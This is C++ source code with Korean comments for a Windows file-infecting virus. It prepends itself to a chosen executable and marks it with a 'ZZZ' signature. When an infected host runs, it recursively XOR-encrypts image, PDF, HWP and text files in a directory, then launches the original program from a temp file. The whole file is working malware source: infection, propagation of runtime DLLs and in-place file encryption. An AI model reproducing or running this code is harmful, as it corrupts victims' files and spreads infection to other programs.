//xls, .doc, .pdf, .jpg, .avi, .rar, .zip, .mp4, .png, .psd, .hwp[25], .java, .js, c, cpp(cc), cs, py
#define _CRT_SECURE_NO_WARNINGS
#include<iostream>
#include<Windows.h>
#include<ShlObj_core.h>
#include<fstream>

#define PATH_SIZE 1024
#define MAX 10000000
enum SEARCH_MODE { DIRECTORY, FILET };

void SearchFile(const char* path, const char* ext, SEARCH_MODE search); //디렉토리, 파일 재귀적 탐색
void FileDecoding(const char* path); //암호화, 복호화

DWORD get_fsize(const char* pth); //파일의 사이즈 구함
char* get_cur_file(); //자기자신의 절대경로 반환
char* get_tfile(); //임시파일 경로 발급받음
int IsInfected(const char* path);
int CheckMySelf();
void Extract_Original();
char* GetDirectory(const char* path);
void InfectProgram(const char* path);

const char* temporary_signature = "infect";
const char* signature = "ZZZ";

struct HYD_struct {
	DWORD fsize;

	char sign[4];
};

char* tchar2char(TCHAR* unicode)
{
	//TCHAR를 char로 변환시켜주는 함수

	char* szRet = NULL;
	int len = ::WideCharToMultiByte(CP_ACP, 0, unicode, -1, szRet, 0, NULL, NULL);

	if (0 < len)
	{
		szRet = (char*)malloc(sizeof(char) * len);
		::ZeroMemory(szRet, len);

		::WideCharToMultiByte(CP_ACP, 0, unicode, -1, szRet, len, NULL, NULL);
	}

	return szRet;
}

int main(int argc, char** argv) {
	setlocale(LC_ALL, ""); //한글을 입력받기 위해 사용

	/*
	* 바탕화면 접근 코드
	TCHAR Desctop_Path[PATH_SIZE];
	SHGetSpecialFolderPath(NULL, Desctop_Path, CSIDL_DESKTOP, FALSE); //바탕화면 경로를 가져온다

	char* path;
	path = tchar2char(Desctop_Path);
	strcpy(DesctopPath, path); //전역변수에 값 대입

	printf("바탕화면 경로 : %s\n", DesctopPath);

	char* InfectTargetPath = (char*)malloc(sizeof(char) * PATH_SIZE);
	sprintf(InfectTargetPath, "%s\\HYDhost.exe", path);

	printf("숙주파일 경로 : %s\n", InfectTargetPath);	
	*/

	char InfectTargetPath[PATH_SIZE];

	char path[PATH_SIZE];

	int DoNotEndTheProgram;


	if (!CheckMySelf()) {
		printf("자기자신이 숙주파일이 아닙니다.\n");
	}
	else {
		//왜 추출이 안되지?
		//fseek랑 ftell 원리를 몰랐기 때문이다

		printf("자기자신이 숙주파일입니다\n");
		printf("암호화를 시작합니다\n");

		printf("암호화하고자 하는 파일의 절대경로: \n\n");
		std::cin.getline(path, PATH_SIZE, '\n');
		//띄어쓰기 구분없이 입력받기 위해 getline을 사용했다

		SearchFile(path, "png", DIRECTORY);
		SearchFile(path, "png", FILET);
		SearchFile(path, "jpg", DIRECTORY);
		SearchFile(path, "jpg", FILET);
		SearchFile(path, "hwp", DIRECTORY);
		SearchFile(path, "hwp", FILET);
		SearchFile(path, "pdf", DIRECTORY);
		SearchFile(path, "pdf", FILET);
		SearchFile(path, "txt", DIRECTORY);
		SearchFile(path, "txt", FILET);		
		

		Extract_Original(); //뒷부분 따로 때네서 실행

		//std::cin >> DoNotEndTheProgram;

		exit(1);
	}

	printf("감염시킬 타겟 프로그램의 절대경로: \n\n");
	std::cin.getline(InfectTargetPath, PATH_SIZE, '\n');
	std::cout << "주소: " << InfectTargetPath << std::endl;

	printf("타겟 프로그램 감염여부 확인...\n");
	
	if (IsInfected(InfectTargetPath)) {
		printf("타겟 프로그램 이미 감염됨\n");
	}
	else {
		printf("타겟 프로그램 감염시키는중...\n");
		InfectProgram(InfectTargetPath);
	}

	//std::cin >> DoNotEndTheProgram;

	return 0;
}

void SearchFile(const char* path, const char* ext, SEARCH_MODE search) {
	WIN32_FIND_DATAA data;
	HANDLE hFind;
	char* newPath = (char*)malloc(sizeof(char) * PATH_SIZE);

	if (search == DIRECTORY) {
		sprintf(newPath, "%s\\*", path);
	}
	else {
		printf(".%s 찾는중\n", ext);
		sprintf(newPath, "%s\\*.%s", path, ext);
	}

	hFind = FindFirstFileA(newPath, &data);
	if (hFind == INVALID_HANDLE_VALUE) {
		return;
	}

	 do{
		if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) && strcmp(data.cFileName, ".") && strcmp(data.cFileName, "..")) {
			std::cout << "디렉토리: " << std::string(data.cFileName) << std::endl;
			sprintf(newPath, "%s\\%s", path, std::string(data.cFileName).c_str());
			SearchFile(newPath, ext, DIRECTORY);
			SearchFile(newPath, ext, FILET);
			
		}
		else if ((search == FILET) && (data.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) && !(data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)) {
			std::cout << "파일: " << std::string(data.cFileName) << std::endl;
			sprintf(newPath, "%s\\%s", path, std::string(data.cFileName).c_str());

			FileDecoding(newPath);
			printf("%s 암호화/복호화 하는중\n", std::string(data.cFileName).c_str());
		}
	}while (FindNextFileA(hFind, &data));

	FindClose(hFind);
	free(newPath);
	return;
}

void FileDecoding(const char* path)
{
	//암호화 & 복호화

	int key = 0x456789AB;

	FILE* file;
	fopen_s(&file, path, "rb");

	if (file == NULL) {
		printf("failed r");
		return;
	}

	int* buffer = (int*)malloc(sizeof(int) * MAX);
	int i = 0;

	while (1)
	{
		buffer[i] = fgetc(file);
		i++;
		if (feof(file) != 0) {
			break;
		}
	}

	fclose(file);


	fopen_s(&file, path, "wb");

	if (file == NULL) {
		printf("failed w");
		return;
	}

	for (int j = 0; j < i-1; j++) {
		fputc(buffer[j] ^ key, file);
	}

	fclose(file);

	free(buffer);
}

DWORD get_fsize(const char* pth)
{
	WIN32_FIND_DATAA fd;
	FindClose(FindFirstFileA(pth, &fd));
	//FindFirstFileA(pth, &fd);
	return fd.nFileSizeLow;
}

char* get_cur_file() {
	char* current = (char*)malloc(sizeof(char) * PATH_SIZE);
	GetModuleFileNameA(NULL, current, PATH_SIZE);
	return current;
}

char* get_tfile()
{

	char tmp_path[1024];
	char* t_pth = new char[1024];

	GetTempPathA(1024, tmp_path);

	GetTempFileNameA(tmp_path, temporary_signature, 1234, t_pth);
	return t_pth;

}

int IsInfected(const char* path) {
	FILE* ReadF;
	fopen_s(&ReadF, path, "rb");

	if (ReadF == NULL) {
		printf("감염대상 파일을 찾지 못했습니다\n");
		return 1;
	}

	HYD_struct buffer;

	fseek(ReadF, get_fsize(path) - sizeof(HYD_struct), SEEK_SET); //순방향으로 HYD_struct 구조체 뺀만큼 이동

	fread((void*)&buffer, 1, sizeof(HYD_struct), ReadF);

	fclose(ReadF);

	printf("buffer : %s\n", buffer.sign);
	printf("strcmp : %d\n", strcmp(buffer.sign, signature));

	if (!strcmp(buffer.sign, signature)) {
		return 1;
	}
	else {
		return 0;
	}
}

int CheckMySelf() {
	char* path = get_cur_file();

	FILE* ReadF;
	fopen_s(&ReadF, path, "rb");

	if (ReadF == NULL) {
		printf("자기자신을 찾지 못했습니다\n");
		return 1;
	}
	printf("자기자신이 숙주파일인지 확인합니다\n");

	fseek(ReadF, get_fsize(path) - sizeof(HYD_struct), SEEK_SET); //순방향으로 HYD_struct 구조체 뺀만큼 이동
	//sizeof(char) 만큼 더 빼줘야 하는 이유는?

	HYD_struct buffer;

	fread((void*)&buffer, 1, sizeof(HYD_struct), ReadF);

	fclose(ReadF);

	printf("buffer : %s\n", buffer.sign);
	printf("strcmp : %d\n", strcmp(buffer.sign, signature));

	free(path);

	if (!strcmp(buffer.sign, signature)) {
		return 1;
	}
	else {
		return 0;
	}
}

void Extract_Original() {
	char* tmp_file = get_tfile();
	char* cur = get_cur_file();
	FILE* ReadF;
	fopen_s(&ReadF, cur, "rb");

	if (ReadF == NULL) {
		printf("감염대상 파일을 찾지 못했습니다\n");
		return;
	}

	FILE* WriteF;
	fopen_s(&WriteF, tmp_file, "wb");

	if (WriteF == NULL) {
		printf("감염대상 파일을 찾지 못했습니다\n");
		fclose(ReadF);

		free(tmp_file);
		return;
	}

	HYD_struct Hstruct;
	int buffer;

	fseek(ReadF, get_fsize(cur) - sizeof(HYD_struct), SEEK_SET); //순방향으로 HYD_struct 구조체 뺀만큼 이동
	//sizeof(char) 만큼 더 빼줘야 하는 이유는?
	printf("ftell before : %d\n", ftell(ReadF));
	fread((void*)&Hstruct, 1, sizeof(HYD_struct), ReadF);
	printf("ftell present : %d\n", ftell(ReadF));

	printf("Hstruct fsize : %d\n", Hstruct.fsize); //fsize 값 이상

	fseek(ReadF, get_fsize(cur) - Hstruct.fsize - sizeof(HYD_struct) - 1, SEEK_SET); //원본 파일 건너뛰고 읽기 시작
	//fseek에서 첫번째 데이터의 위치(SEEK_SET)가 0이다.

	printf("ftell after : %d\n", ftell(ReadF));

	while (ftell(ReadF) != get_fsize(cur) - sizeof(HYD_struct) - 1)
	{
		//ftell은 가장 앞부분 바이트 위치를 0으로 간주한다는 점을 주의하자(1을 빼는 이유)
		buffer = fgetc(ReadF);
		fputc(buffer, WriteF);
	}

	fclose(ReadF);
	fflush(WriteF);
	fclose(WriteF);

	//임시파일 실행하기
	//startup(tmp_file);
	//ShellExecuteA(NULL, "open", tmp_file, NULL, NULL, SW_SHOWDEFAULT);
	//tmp 파일은 실행안됨. 따로 저장 후 실행?

	printf("원본 프로그램 실행중\n");
	WinExec(tmp_file, SW_NORMAL);

	//code injection 찾아보기
	free(tmp_file);
	free(cur);
}

char* GetDirectory(const char* path) {
	//디렉토리 추출
	int i = 0;
	int lastWpos = 0;
	char* InfectedDictionary = (char*)malloc(sizeof(char) * PATH_SIZE);
	while (1) {
		if (path[i] == '\0')
			break;
		if (path[i] == '\\')
			lastWpos = i;
		i++;
	}

	for (i = 0; i < lastWpos; i++) {
		InfectedDictionary[i] = path[i];
	}
	InfectedDictionary[i] = '\0';

	return InfectedDictionary;
}

void InfectProgram(const char* path) {
	char* tmp_file = get_tfile();
	char* cur = get_cur_file();
	int buffer;
	HYD_struct hs;

	FILE* ReadF;
	fopen_s(&ReadF, cur, "rb");

	if (ReadF == NULL) {
		printf("failed r");
		return;
	}

	FILE* WriteF;
	fopen_s(&WriteF, tmp_file, "wb");

	if (WriteF == NULL) {
		printf("failed w");
		fclose(ReadF);
		return;
	}

	printf("자기자신 임시파일로 복사중...\n");
	while (1)
	{
		buffer = fgetc(ReadF);
		fputc(buffer, WriteF);
		if (feof(ReadF) != 0) {
			break;
		}
	}

	fflush(WriteF);
	fclose(ReadF);


	fopen_s(&ReadF, path, "rb");
	printf("원본파일 임시파일로 복사중...\n");
	if (ReadF == NULL) {
		printf("failed r");
		return;
	}

	fseek(WriteF, 0L, SEEK_END);//끝으로 이동
	//fseek SEEK_END는 파일 데이터 마지막이 아니라 파일의 끝을 표시하기 위해 삽입되는 EOF를 의미

	while (1)
	{
		buffer = fgetc(ReadF);
		fputc(buffer, WriteF);
		if (feof(ReadF) != 0) {
			break;
		}
	}
	fflush(WriteF);
	fclose(ReadF);

	//HYD Struct 데이터 추가//
	fseek(WriteF, 0L, SEEK_END);

	hs.fsize = get_fsize(path); //감염 대상 원본 사이즈 저장
	strcpy(hs.sign, signature);

	fwrite((void*)&hs, sizeof(HYD_struct), 1, WriteF);
	
	fflush(WriteF);	
	fclose(WriteF);
	

	printf("임시파일 원본파일에 덮어쓰는중...\n");

	CopyFileA(tmp_file, path, false);

	char* InfectDirectory = GetDirectory(path);
	
	printf("infectedDirectory: %s\n", InfectDirectory);

	char* Destination1 = (char*)malloc(sizeof(char) * PATH_SIZE);
	char* Destination2 = (char*)malloc(sizeof(char) * PATH_SIZE);


	sprintf(Destination1, "%s\\MSVCP140.dll", InfectDirectory);
	CopyFileA("MSVCP140.dll", Destination1, false);

	sprintf(Destination2, "%s\\VCRUNTIME140.dll", InfectDirectory);
	CopyFileA("VCRUNTIME140.dll", Destination2, false);
	
	printf("복제완료\n");

	free(InfectDirectory);
	free(Destination1);
	free(Destination2);
	free(tmp_file);
	free(cur);
}
